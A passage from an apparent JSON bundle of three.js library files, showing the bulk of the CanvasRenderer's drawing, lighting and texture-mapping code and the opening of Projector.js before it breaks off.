_canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clearBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t};\n\n\tthis.setClearColorHex = function ( hex, alpha ) {\n\n\t\tconsole.warn( 'THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.' );\n\t\tthis.setClearColor( hex, alpha );\n\n\t};\n\n\tthis.getClearColor = function () {\n\n\t\treturn _clearColor;\n\n\t};\n\n\tthis.getClearAlpha = function () {\n\n\t\treturn _clearAlpha;\n\n\t};\n\n\tthis.getMaxAnisotropy = function () {\n\n\t\treturn 0;\n\n\t};\n\n\tthis.clear = function () {\n\n\t\tif ( _clearBox.isEmpty() === false ) {\n\n\t\t\t_clearBox.intersect( _clipBox );\n\t\t\t_clearBox.expandByScalar( 2 );\n\n\t\t\t_clearBox.min.x = _clearBox.min.x + _canvasWidthHalf;\n\t\t\t_clearBox.min.y =  - _clearBox.min.y + _canvasHeightHalf;\t\t// higher y value !\n\t\t\t_clearBox.max.x = _clearBox.max.x + _canvasWidthHalf;\n\t\t\t_clearBox.max.y =  - _clearBox.max.y + _canvasHeightHalf;\t\t// lower y value !\n\n\t\t\tif ( _clearAlpha < 1 ) {\n\n\t\t\t\t_context.clearRect(\n\t\t\t\t\t_clearBox.min.x | 0,\n\t\t\t\t\t_clearBox.max.y | 0,\n\t\t\t\t\t( _clearBox.max.x - _clearBox.min.x ) | 0,\n\t\t\t\t\t( _clearBox.min.y - _clearBox.max.y ) | 0\n\t\t\t\t);\n\n\t\t\t}\n\n\t\t\tif ( _clearAlpha > 0 ) {\n\n\t\t\t\tsetBlending( THREE.NormalBlending );\n\t\t\t\tsetOpacity( 1 );\n\n\t\t\t\tsetFillStyle( 'rgba(' + Math.floor( _clearColor.r * 255 ) + ',' + Math.floor( _clearColor.g * 255 ) + ',' + Math.floor( _clearColor.b * 255 ) + ',' + _clearAlpha + ')' );\n\n\t\t\t\t_context.fillRect(\n\t\t\t\t\t_clearBox.min.x | 0,\n\t\t\t\t\t_clearBox.max.y | 0,\n\t\t\t\t\t( _clearBox.max.x - _clearBox.min.x ) | 0,\n\t\t\t\t\t( _clearBox.min.y - _clearBox.max.y ) | 0\n\t\t\t\t);\n\n\t\t\t}\n\n\t\t\t_clearBox.makeEmpty();\n\n\t\t}\n\n\t};\n\n\t// compatibility\n\n\tthis.clearColor = function () {};\n\tthis.clearDepth = function () {};\n\tthis.clearStencil = function () {};\n\n\tthis.render = function ( scene, camera ) {\n\n\t\tif ( camera instanceof THREE.Camera === false ) {\n\n\t\t\tconsole.error( 'THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.' );\n\t\t\treturn;\n\n\t\t}\n\n\t\tvar background = scene.background;\n\n\t\tif ( background && background.isColor ) {\n\n\t\t\tsetFillStyle( 'rgb(' + Math.floor( background.r * 255 ) + ',' + Math.floor( background.g * 255 ) + ',' + Math.floor( background.b * 255 ) + ')' );\n\t\t\t_context.fillRect( 0, 0, _canvasWidth, _canvasHeight );\n\n\t\t} else if ( this.autoClear === true ) {\n\n\t\t\tthis.clear();\n\n\t\t}\n\n\t\t_this.info.render.vertices = 0;\n\t\t_this.info.render.faces = 0;\n\n\t\t_context.setTransform( _viewportWidth / _canvasWidth, 0, 0, - _viewportHeight / _canvasHeight, _viewportX, _canvasHeight - _viewportY );\n\t\t_context.translate( _canvasWidthHalf, _canvasHeightHalf );\n\n\t\t_renderData = _projector.projectScene( scene, camera, this.sortObjects, this.sortElements );\n\t\t_elements = _renderData.elements;\n\t\t_lights = _renderData.lights;\n\t\t_camera = camera;\n\n\t\t_normalViewMatrix.getNormalMatrix( camera.matrixWorldInverse );\n\n\t\t/* DEBUG\n\t\tsetFillStyle( 'rgba( 0, 255, 255, 0.5 )' );\n\t\t_context.fillRect( _clipBox.min.x, _clipBox.min.y, _clipBox.max.x - _clipBox.min.x, _clipBox.max.y - _clipBox.min.y );\n\t\t*/\n\n\t\tcalculateLights();\n\n\t\tfor ( var e = 0, el = _elements.length; e < el; e ++ ) {\n\n\t\t\tvar element = _elements[ e ];\n\n\t\t\tvar material = element.material;\n\n\t\t\tif ( material === undefined || material.opacity === 0 ) continue;\n\n\t\t\t_elemBox.makeEmpty();\n\n\t\t\tif ( element instanceof THREE.RenderableSprite ) {\n\n\t\t\t\t_v1 = element;\n\t\t\t\t_v1.x *= _canvasWidthHalf; _v1.y *= _canvasHeightHalf;\n\n\t\t\t\trenderSprite( _v1, element, material );\n\n\t\t\t} else if ( element instanceof THREE.RenderableLine ) {\n\n\t\t\t\t_v1 = element.v1; _v2 = element.v2;\n\n\t\t\t\t_v1.positionScreen.x *= _canvasWidthHalf; _v1.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v2.positionScreen.x *= _canvasWidthHalf; _v2.positionScreen.y *= _canvasHeightHalf;\n\n\t\t\t\t_elemBox.setFromPoints( [\n\t\t\t\t\t_v1.positionScreen,\n\t\t\t\t\t_v2.positionScreen\n\t\t\t\t] );\n\n\t\t\t\tif ( _clipBox.intersectsBox( _elemBox ) === true ) {\n\n\t\t\t\t\trenderLine( _v1, _v2, element, material );\n\n\t\t\t\t}\n\n\t\t\t} else if ( element instanceof THREE.RenderableFace ) {\n\n\t\t\t\t_v1 = element.v1; _v2 = element.v2; _v3 = element.v3;\n\n\t\t\t\tif ( _v1.positionScreen.z < - 1 || _v1.positionScreen.z > 1 ) continue;\n\t\t\t\tif ( _v2.positionScreen.z < - 1 || _v2.positionScreen.z > 1 ) continue;\n\t\t\t\tif ( _v3.positionScreen.z < - 1 || _v3.positionScreen.z > 1 ) continue;\n\n\t\t\t\t_v1.positionScreen.x *= _canvasWidthHalf; _v1.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v2.positionScreen.x *= _canvasWidthHalf; _v2.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v3.positionScreen.x *= _canvasWidthHalf; _v3.positionScreen.y *= _canvasHeightHalf;\n\n\t\t\t\tif ( material.overdraw > 0 ) {\n\n\t\t\t\t\texpand( _v1.positionScreen, _v2.positionScreen, material.overdraw );\n\t\t\t\t\texpand( _v2.positionScreen, _v3.positionScreen, material.overdraw );\n\t\t\t\t\texpand( _v3.positionScreen, _v1.positionScreen, material.overdraw );\n\n\t\t\t\t}\n\n\t\t\t\t_elemBox.setFromPoints( [\n\t\t\t\t\t_v1.positionScreen,\n\t\t\t\t\t_v2.positionScreen,\n\t\t\t\t\t_v3.positionScreen\n\t\t\t\t] );\n\n\t\t\t\tif ( _clipBox.intersectsBox( _elemBox ) === true ) {\n\n\t\t\t\t\trenderFace3( _v1, _v2, _v3, 0, 1, 2, element, material );\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t/* DEBUG\n\t\t\tsetLineWidth( 1 );\n\t\t\tsetStrokeStyle( 'rgba( 0, 255, 0, 0.5 )' );\n\t\t\t_context.strokeRect( _elemBox.min.x, _elemBox.min.y, _elemBox.max.x - _elemBox.min.x, _elemBox.max.y - _elemBox.min.y );\n\t\t\t*/\n\n\t\t\t_clearBox.union( _elemBox );\n\n\t\t}\n\n\t\t/* DEBUG\n\t\tsetLineWidth( 1 );\n\t\tsetStrokeStyle( 'rgba( 255, 0, 0, 0.5 )' );\n\t\t_context.strokeRect( _clearBox.min.x, _clearBox.min.y, _clearBox.max.x - _clearBox.min.x, _clearBox.max.y - _clearBox.min.y );\n\t\t*/\n\n\t\t_context.setTransform( 1, 0, 0, 1, 0, 0 );\n\n\t};\n\n\t//\n\n\tfunction calculateLights() {\n\n\t\t_ambientLight.setRGB( 0, 0, 0 );\n\t\t_directionalLights.setRGB( 0, 0, 0 );\n\t\t_pointLights.setRGB( 0, 0, 0 );\n\n\t\tfor ( var l = 0, ll = _lights.length; l < ll; l ++ ) {\n\n\t\t\tvar light = _lights[ l ];\n\t\t\tvar lightColor = light.color;\n\n\t\t\tif ( light instanceof THREE.AmbientLight ) {\n\n\t\t\t\t_ambientLight.add( lightColor );\n\n\t\t\t} else if ( light instanceof THREE.DirectionalLight ) {\n\n\t\t\t\t// for sprites\n\n\t\t\t\t_directionalLights.add( lightColor );\n\n\t\t\t} else if ( light instanceof THREE.PointLight ) {\n\n\t\t\t\t// for sprites\n\n\t\t\t\t_pointLights.add( lightColor );\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\tfunction calculateLight( position, normal, color ) {\n\n\t\tfor ( var l = 0, ll = _lights.length; l < ll; l ++ ) {\n\n\t\t\tvar light = _lights[ l ];\n\n\t\t\t_lightColor.copy( light.color );\n\n\t\t\tif ( light instanceof THREE.DirectionalLight ) {\n\n\t\t\t\tvar lightPosition = _vector3.setFromMatrixPosition( light.matrixWorld ).normalize();\n\n\t\t\t\tvar amount = normal.dot( lightPosition );\n\n\t\t\t\tif ( amount <= 0 ) continue;\n\n\t\t\t\tamount *= light.intensity;\n\n\t\t\t\tcolor.add( _lightColor.multiplyScalar( amount ) );\n\n\t\t\t} else if ( light instanceof THREE.PointLight ) {\n\n\t\t\t\tvar lightPosition = _vector3.setFromMatrixPosition( light.matrixWorld );\n\n\t\t\t\tvar amount = normal.dot( _vector3.subVectors( lightPosition, position ).normalize() );\n\n\t\t\t\tif ( amount <= 0 ) continue;\n\n\t\t\t\tamount *= light.distance == 0 ? 1 : 1 - Math.min( position.distanceTo( lightPosition ) / light.distance, 1 );\n\n\t\t\t\tif ( amount == 0 ) continue;\n\n\t\t\t\tamount *= light.intensity;\n\n\t\t\t\tcolor.add( _lightColor.multiplyScalar( amount ) );\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n\tfunction renderSprite( v1, element, material ) {\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\tvar scaleX = element.scale.x * _canvasWidthHalf;\n\t\tvar scaleY = element.scale.y * _canvasHeightHalf;\n\n\t\tvar dist = 0.5 * Math.sqrt( scaleX * scaleX + scaleY * scaleY ); // allow for rotated sprite\n\t\t_elemBox.min.set( v1.x - dist, v1.y - dist );\n\t\t_elemBox.max.set( v1.x + dist, v1.y + dist );\n\n\t\tif ( material instanceof THREE.SpriteMaterial ) {\n\n\t\t\tvar texture = material.map;\n\n\t\t\tif ( texture !== null ) {\n\n\t\t\t\tvar pattern = _patterns[ texture.id ];\n\n\t\t\t\tif ( pattern === undefined || pattern.version !== texture.version ) {\n\n\t\t\t\t\tpattern = textureToPattern( texture );\n\t\t\t\t\t_patterns[ texture.id ] = pattern;\n\n\t\t\t\t}\n\n\t\t\t\tif ( pattern.canvas !== undefined ) {\n\n\t\t\t\t\tsetFillStyle( pattern.canvas );\n\n\t\t\t\t\tvar bitmap = texture.image;\n\n\t\t\t\t\tvar ox = bitmap.width * texture.offset.x;\n\t\t\t\t\tvar oy = bitmap.height * texture.offset.y;\n\n\t\t\t\t\tvar sx = bitmap.width * texture.repeat.x;\n\t\t\t\t\tvar sy = bitmap.height * texture.repeat.y;\n\n\t\t\t\t\tvar cx = scaleX / sx;\n\t\t\t\t\tvar cy = scaleY / sy;\n\n\t\t\t\t\t_context.save();\n\t\t\t\t\t_context.translate( v1.x, v1.y );\n\t\t\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t\t\t_context.translate( - scaleX / 2, - scaleY / 2 );\n\t\t\t\t\t_context.scale( cx, cy );\n\t\t\t\t\t_context.translate( - ox, - oy );\n\t\t\t\t\t_context.fillRect( ox, oy, sx, sy );\n\t\t\t\t\t_context.restore();\n\n\t\t\t\t}\n\n\t\t\t} else {\n\n\t\t\t\t// no texture\n\n\t\t\t\tsetFillStyle( material.color.getStyle() );\n\n\t\t\t\t_context.save();\n\t\t\t\t_context.translate( v1.x, v1.y );\n\t\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t\t_context.scale( scaleX, - scaleY );\n\t\t\t\t_context.fillRect( - 0.5, - 0.5, 1, 1 );\n\t\t\t\t_context.restore();\n\n\t\t\t}\n\n\t\t} else if ( material instanceof THREE.SpriteCanvasMaterial ) {\n\n\t\t\tsetStrokeStyle( material.color.getStyle() );\n\t\t\tsetFillStyle( material.color.getStyle() );\n\n\t\t\t_context.save();\n\t\t\t_context.translate( v1.x, v1.y );\n\t\t\tif ( material.rotation !== 0 ) _context.rotate( material.rotation );\n\t\t\t_context.scale( scaleX, scaleY );\n\n\t\t\tmaterial.program( _context );\n\n\t\t\t_context.restore();\n\n\t\t}\n\n\t\t/* DEBUG\n\t\tsetStrokeStyle( 'rgb(255,255,0)' );\n\t\t_context.beginPath();\n\t\t_context.moveTo( v1.x - 10, v1.y );\n\t\t_context.lineTo( v1.x + 10, v1.y );\n\t\t_context.moveTo( v1.x, v1.y - 10 );\n\t\t_context.lineTo( v1.x, v1.y + 10 );\n\t\t_context.stroke();\n\t\t*/\n\n\t}\n\n\tfunction renderLine( v1, v2, element, material ) {\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\t_context.beginPath();\n\t\t_context.moveTo( v1.positionScreen.x, v1.positionScreen.y );\n\t\t_context.lineTo( v2.positionScreen.x, v2.positionScreen.y );\n\n\t\tif ( material instanceof THREE.LineBasicMaterial ) {\n\n\t\t\tsetLineWidth( material.linewidth );\n\t\t\tsetLineCap( material.linecap );\n\t\t\tsetLineJoin( material.linejoin );\n\n\t\t\tif ( material.vertexColors !== THREE.VertexColors ) {\n\n\t\t\t\tsetStrokeStyle( material.color.getStyle() );\n\n\t\t\t} else {\n\n\t\t\t\tvar colorStyle1 = element.vertexColors[ 0 ].getStyle();\n\t\t\t\tvar colorStyle2 = element.vertexColors[ 1 ].getStyle();\n\n\t\t\t\tif ( colorStyle1 === colorStyle2 ) {\n\n\t\t\t\t\tsetStrokeStyle( colorStyle1 );\n\n\t\t\t\t} else {\n\n\t\t\t\t\ttry {\n\n\t\t\t\t\t\tvar grad = _context.createLinearGradient(\n\t\t\t\t\t\t\tv1.positionScreen.x,\n\t\t\t\t\t\t\tv1.positionScreen.y,\n\t\t\t\t\t\t\tv2.positionScreen.x,\n\t\t\t\t\t\t\tv2.positionScreen.y\n\t\t\t\t\t\t);\n\t\t\t\t\t\tgrad.addColorStop( 0, colorStyle1 );\n\t\t\t\t\t\tgrad.addColorStop( 1, colorStyle2 );\n\n\t\t\t\t\t} catch ( exception ) {\n\n\t\t\t\t\t\tgrad = colorStyle1;\n\n\t\t\t\t\t}\n\n\t\t\t\t\tsetStrokeStyle( grad );\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t_context.stroke();\n\t\t\t_elemBox.expandByScalar( material.linewidth * 2 );\n\n\t\t} else if ( material instanceof THREE.LineDashedMaterial ) {\n\n\t\t\tsetLineWidth( material.linewidth );\n\t\t\tsetLineCap( material.linecap );\n\t\t\tsetLineJoin( material.linejoin );\n\t\t\tsetStrokeStyle( material.color.getStyle() );\n\t\t\tsetLineDash( [ material.dashSize, material.gapSize ] );\n\n\t\t\t_context.stroke();\n\n\t\t\t_elemBox.expandByScalar( material.linewidth * 2 );\n\n\t\t\tsetLineDash( [] );\n\n\t\t}\n\n\t}\n\n\tfunction renderFace3( v1, v2, v3, uv1, uv2, uv3, element, material ) {\n\n\t\t_this.info.render.vertices += 3;\n\t\t_this.info.render.faces ++;\n\n\t\tsetOpacity( material.opacity );\n\t\tsetBlending( material.blending );\n\n\t\t_v1x = v1.positionScreen.x; _v1y = v1.positionScreen.y;\n\t\t_v2x = v2.positionScreen.x; _v2y = v2.positionScreen.y;\n\t\t_v3x = v3.positionScreen.x; _v3y = v3.positionScreen.y;\n\n\t\tdrawTriangle( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y );\n\n\t\tif ( ( material instanceof THREE.MeshLambertMaterial || material instanceof THREE.MeshPhongMaterial ) && material.map === null ) {\n\n\t\t\t_diffuseColor.copy( material.color );\n\t\t\t_emissiveColor.copy( material.emissive );\n\n\t\t\tif ( material.vertexColors === THREE.FaceColors ) {\n\n\t\t\t\t_diffuseColor.multiply( element.color );\n\n\t\t\t}\n\n\t\t\t_color.copy( _ambientLight );\n\n\t\t\t_centroid.copy( v1.positionWorld ).add( v2.positionWorld ).add( v3.positionWorld ).divideScalar( 3 );\n\n\t\t\tcalculateLight( _centroid, element.normalModel, _color );\n\n\t\t\t_color.multiply( _diffuseColor ).add( _emissiveColor );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t} else if ( material instanceof THREE.MeshBasicMaterial ||\n\t\t\t\t    material instanceof THREE.MeshLambertMaterial ||\n\t\t\t\t    material instanceof THREE.MeshPhongMaterial ) {\n\n\t\t\tif ( material.map !== null ) {\n\n\t\t\t\tvar mapping = material.map.mapping;\n\n\t\t\t\tif ( mapping === THREE.UVMapping ) {\n\n\t\t\t\t\t_uvs = element.uvs;\n\t\t\t\t\tpatternPath( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y, _uvs[ uv1 ].x, _uvs[ uv1 ].y, _uvs[ uv2 ].x, _uvs[ uv2 ].y, _uvs[ uv3 ].x, _uvs[ uv3 ].y, material.map );\n\n\t\t\t\t}\n\n\t\t\t} else if ( material.envMap !== null ) {\n\n\t\t\t\tif ( material.envMap.mapping === THREE.SphericalReflectionMapping ) {\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv1 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv1x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv1y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv2 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv2x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv2y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\t_normal.copy( element.vertexNormalsModel[ uv3 ] ).applyMatrix3( _normalViewMatrix );\n\t\t\t\t\t_uv3x = 0.5 * _normal.x + 0.5;\n\t\t\t\t\t_uv3y = 0.5 * _normal.y + 0.5;\n\n\t\t\t\t\tpatternPath( _v1x, _v1y, _v2x, _v2y, _v3x, _v3y, _uv1x, _uv1y, _uv2x, _uv2y, _uv3x, _uv3y, material.envMap );\n\n\t\t\t\t}\n\n\t\t\t} else {\n\n\t\t\t\t_color.copy( material.color );\n\n\t\t\t\tif ( material.vertexColors === THREE.FaceColors ) {\n\n\t\t\t\t\t_color.multiply( element.color );\n\n\t\t\t\t}\n\n\t\t\t\tmaterial.wireframe === true\n\t\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t\t : fillPath( _color );\n\n\t\t\t}\n\n\t\t} else if ( material instanceof THREE.MeshNormalMaterial ) {\n\n\t\t\t_normal.copy( element.normalModel ).applyMatrix3( _normalViewMatrix );\n\n\t\t\t_color.setRGB( _normal.x, _normal.y, _normal.z ).multiplyScalar( 0.5 ).addScalar( 0.5 );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t} else {\n\n\t\t\t_color.setRGB( 1, 1, 1 );\n\n\t\t\tmaterial.wireframe === true\n\t\t\t\t ? strokePath( _color, material.wireframeLinewidth, material.wireframeLinecap, material.wireframeLinejoin )\n\t\t\t\t : fillPath( _color );\n\n\t\t}\n\n\t}\n\n\t//\n\n\tfunction drawTriangle( x0, y0, x1, y1, x2, y2 ) {\n\n\t\t_context.beginPath();\n\t\t_context.moveTo( x0, y0 );\n\t\t_context.lineTo( x1, y1 );\n\t\t_context.lineTo( x2, y2 );\n\t\t_context.closePath();\n\n\t}\n\n\tfunction strokePath( color, linewidth, linecap, linejoin ) {\n\n\t\tsetLineWidth( linewidth );\n\t\tsetLineCap( linecap );\n\t\tsetLineJoin( linejoin );\n\t\tsetStrokeStyle( color.getStyle() );\n\n\t\t_context.stroke();\n\n\t\t_elemBox.expandByScalar( linewidth * 2 );\n\n\t}\n\n\tfunction fillPath( color ) {\n\n\t\tsetFillStyle( color.getStyle() );\n\t\t_context.fill();\n\n\t}\n\n\tfunction textureToPattern( texture ) {\n\n\t\tif ( texture.version === 0 ||\n\t\t\ttexture instanceof THREE.CompressedTexture ||\n\t\t\ttexture instanceof THREE.DataTexture ) {\n\n\t\t\treturn {\n\t\t\t\tcanvas: undefined,\n\t\t\t\tversion: texture.version\n\t\t\t};\n\n\t\t}\n\n\t\tvar image = texture.image;\n\n\t\tif ( image.complete === false ) {\n\n\t\t\treturn {\n\t\t\t\tcanvas: undefined,\n\t\t\t\tversion: 0\n\t\t\t};\n\n\t\t}\n\n\t\tvar repeatX = texture.wrapS === THREE.RepeatWrapping || texture.wrapS === THREE.MirroredRepeatWrapping;\n\t\tvar repeatY = texture.wrapT === THREE.RepeatWrapping || texture.wrapT === THREE.MirroredRepeatWrapping;\n\n\t\tvar mirrorX = texture.wrapS === THREE.MirroredRepeatWrapping;\n\t\tvar mirrorY = texture.wrapT === THREE.MirroredRepeatWrapping;\n\n\t\t//\n\n\t\tvar canvas = document.createElement( 'canvas' );\n\t\tcanvas.width = image.width * ( mirrorX ? 2 : 1 );\n\t\tcanvas.height = image.height * ( mirrorY ? 2 : 1 );\n\n\t\tvar context = canvas.getContext( '2d' );\n\t\tcontext.setTransform( 1, 0, 0, - 1, 0, image.height );\n\t\tcontext.drawImage( image, 0, 0 );\n\n\t\tif ( mirrorX === true ) {\n\n\t\t\tcontext.setTransform( - 1, 0, 0, - 1, image.width, image.height );\n\t\t\tcontext.drawImage( image, - image.width, 0 );\n\n\t\t}\n\n\t\tif ( mirrorY === true ) {\n\n\t\t\tcontext.setTransform( 1, 0, 0, 1, 0, 0 );\n\t\t\tcontext.drawImage( image, 0, image.height );\n\n\t\t}\n\n\t\tif ( mirrorX === true && mirrorY === true ) {\n\n\t\t\tcontext.setTransform( - 1, 0, 0, 1, image.width, 0 );\n\t\t\tcontext.drawImage( image, - image.width, image.height );\n\n\t\t}\n\n\t\tvar repeat = 'no-repeat';\n\n\t\tif ( repeatX === true && repeatY === true ) {\n\n\t\t\trepeat = 'repeat';\n\n\t\t} else if ( repeatX === true ) {\n\n\t\t\trepeat = 'repeat-x';\n\n\t\t} else if ( repeatY === true ) {\n\n\t\t\trepeat = 'repeat-y';\n\n\t\t}\n\n\t\tvar pattern = _context.createPattern( canvas, repeat );\n\n\t\tif ( texture.onUpdate ) texture.onUpdate( texture );\n\n\t\treturn {\n\t\t\tcanvas: pattern,\n\t\t\tversion: texture.version\n\t\t};\n\n\t}\n\n\tfunction patternPath( x0, y0, x1, y1, x2, y2, u0, v0, u1, v1, u2, v2, texture ) {\n\n\t\tvar pattern = _patterns[ texture.id ];\n\n\t\tif ( pattern === undefined || pattern.version !== texture.version ) {\n\n\t\t\tpattern = textureToPattern( texture );\n\t\t\t_patterns[ texture.id ] = pattern;\n\n\t\t}\n\n\t\tif ( pattern.canvas !== undefined ) {\n\n\t\t\tsetFillStyle( pattern.canvas );\n\n\t\t} else {\n\n\t\t\tsetFillStyle( 'rgba( 0, 0, 0, 1)' );\n\t\t\t_context.fill();\n\t\t\treturn;\n\n\t\t}\n\n\t\t// http://extremelysatisfactorytotalitarianism.com/blog/?p=2120\n\n\t\tvar a, b, c, d, e, f, det, idet,\n\t\toffsetX = texture.offset.x / texture.repeat.x,\n\t\toffsetY = texture.offset.y / texture.repeat.y,\n\t\twidth = texture.image.width * texture.repeat.x,\n\t\theight = texture.image.height * texture.repeat.y;\n\n\t\tu0 = ( u0 + offsetX ) * width;\n\t\tv0 = ( v0 + offsetY ) * height;\n\n\t\tu1 = ( u1 + offsetX ) * width;\n\t\tv1 = ( v1 + offsetY ) * height;\n\n\t\tu2 = ( u2 + offsetX ) * width;\n\t\tv2 = ( v2 + offsetY ) * height;\n\n\t\tx1 -= x0; y1 -= y0;\n\t\tx2 -= x0; y2 -= y0;\n\n\t\tu1 -= u0; v1 -= v0;\n\t\tu2 -= u0; v2 -= v0;\n\n\t\tdet = u1 * v2 - u2 * v1;\n\n\t\tif ( det === 0 ) return;\n\n\t\tidet = 1 / det;\n\n\t\ta = ( v2 * x1 - v1 * x2 ) * idet;\n\t\tb = ( v2 * y1 - v1 * y2 ) * idet;\n\t\tc = ( u1 * x2 - u2 * x1 ) * idet;\n\t\td = ( u1 * y2 - u2 * y1 ) * idet;\n\n\t\te = x0 - a * u0 - c * v0;\n\t\tf = y0 - b * u0 - d * v0;\n\n\t\t_context.save();\n\t\t_context.transform( a, b, c, d, e, f );\n\t\t_context.fill();\n\t\t_context.restore();\n\n\t}\n\n\tfunction clipImage( x0, y0, x1, y1, x2, y2, u0, v0, u1, v1, u2, v2, image ) {\n\n\t\t// http://extremelysatisfactorytotalitarianism.com/blog/?p=2120\n\n\t\tvar a, b, c, d, e, f, det, idet,\n\t\twidth = image.width - 1,\n\t\theight = image.height - 1;\n\n\t\tu0 *= width; v0 *= height;\n\t\tu1 *= width; v1 *= height;\n\t\tu2 *= width; v2 *= height;\n\n\t\tx1 -= x0; y1 -= y0;\n\t\tx2 -= x0; y2 -= y0;\n\n\t\tu1 -= u0; v1 -= v0;\n\t\tu2 -= u0; v2 -= v0;\n\n\t\tdet = u1 * v2 - u2 * v1;\n\n\t\tidet = 1 / det;\n\n\t\ta = ( v2 * x1 - v1 * x2 ) * idet;\n\t\tb = ( v2 * y1 - v1 * y2 ) * idet;\n\t\tc = ( u1 * x2 - u2 * x1 ) * idet;\n\t\td = ( u1 * y2 - u2 * y1 ) * idet;\n\n\t\te = x0 - a * u0 - c * v0;\n\t\tf = y0 - b * u0 - d * v0;\n\n\t\t_context.save();\n\t\t_context.transform( a, b, c, d, e, f );\n\t\t_context.clip();\n\t\t_context.drawImage( image, 0, 0 );\n\t\t_context.restore();\n\n\t}\n\n\t// Hide anti-alias gaps\n\n\tfunction expand( v1, v2, pixels ) {\n\n\t\tvar x = v2.x - v1.x, y = v2.y - v1.y,\n\t\tdet = x * x + y * y, idet;\n\n\t\tif ( det === 0 ) return;\n\n\t\tidet = pixels / Math.sqrt( det );\n\n\t\tx *= idet; y *= idet;\n\n\t\tv2.x += x; v2.y += y;\n\t\tv1.x -= x; v1.y -= y;\n\n\t}\n\n\t// Context cached methods.\n\n\tfunction setOpacity( value ) {\n\n\t\tif ( _contextGlobalAlpha !== value ) {\n\n\t\t\t_context.globalAlpha = value;\n\t\t\t_contextGlobalAlpha = value;\n\n\t\t}\n\n\t}\n\n\tfunction setBlending( value ) {\n\n\t\tif ( _contextGlobalCompositeOperation !== value ) {\n\n\t\t\tif ( value === THREE.NormalBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'source-over';\n\n\t\t\t} else if ( value === THREE.AdditiveBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'lighter';\n\n\t\t\t} else if ( value === THREE.SubtractiveBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'darker';\n\n\t\t\t} else if ( value === THREE.MultiplyBlending ) {\n\n\t\t\t\t_context.globalCompositeOperation = 'multiply';\n\n\t\t\t}\n\n\t\t\t_contextGlobalCompositeOperation = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineWidth( value ) {\n\n\t\tif ( _contextLineWidth !== value ) {\n\n\t\t\t_context.lineWidth = value;\n\t\t\t_contextLineWidth = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineCap( value ) {\n\n\t\t// \"butt\", \"round\", \"square\"\n\n\t\tif ( _contextLineCap !== value ) {\n\n\t\t\t_context.lineCap = value;\n\t\t\t_contextLineCap = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineJoin( value ) {\n\n\t\t// \"round\", \"bevel\", \"miter\"\n\n\t\tif ( _contextLineJoin !== value ) {\n\n\t\t\t_context.lineJoin = value;\n\t\t\t_contextLineJoin = value;\n\n\t\t}\n\n\t}\n\n\tfunction setStrokeStyle( value ) {\n\n\t\tif ( _contextStrokeStyle !== value ) {\n\n\t\t\t_context.strokeStyle = value;\n\t\t\t_contextStrokeStyle = value;\n\n\t\t}\n\n\t}\n\n\tfunction setFillStyle( value ) {\n\n\t\tif ( _contextFillStyle !== value ) {\n\n\t\t\t_context.fillStyle = value;\n\t\t\t_contextFillStyle = value;\n\n\t\t}\n\n\t}\n\n\tfunction setLineDash( value ) {\n\n\t\tif ( _contextLineDash.length !== value.length ) {\n\n\t\t\t_context.setLineDash( value );\n\t\t\t_contextLineDash = value;\n\n\t\t}\n\n\t}\n\n};\n"},{"url":"/lib/three/lib/Projector.js","content":"/**\n * @author mrdoob / http://mrdoob.com/\n * @author supereggbert / http://www.paulbrunt.co.uk/\n * @author julianwa / https://github.com/julianwa\n */\n\nTHREE.RenderableObject = function () {\n\n\tthis.id = 0;\n\n\tthis.object = null;\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableFace = function () {\n\n\tthis.id = 0;\n\n\tthis.v1 = new THREE.RenderableVertex();\n\tthis.v2 = new THREE.RenderableVertex();\n\tthis.v3 = new THREE.RenderableVertex();\n\n\tthis.normalModel = new THREE.Vector3();\n\n\tthis.vertexNormalsModel = [ new THREE.Vector3(), new THREE.Vector3(), new THREE.Vector3() ];\n\tthis.vertexNormalsLength = 0;\n\n\tthis.color = new THREE.Color();\n\tthis.material = null;\n\tthis.uvs = [ new THREE.Vector2(), new THREE.Vector2(), new THREE.Vector2() ];\n\n\tthis.z = 0;\n\tthis.renderOrder = 0;\n\n};\n\n//\n\nTHREE.RenderableVertex = function () {\n\n\tthis.position = new 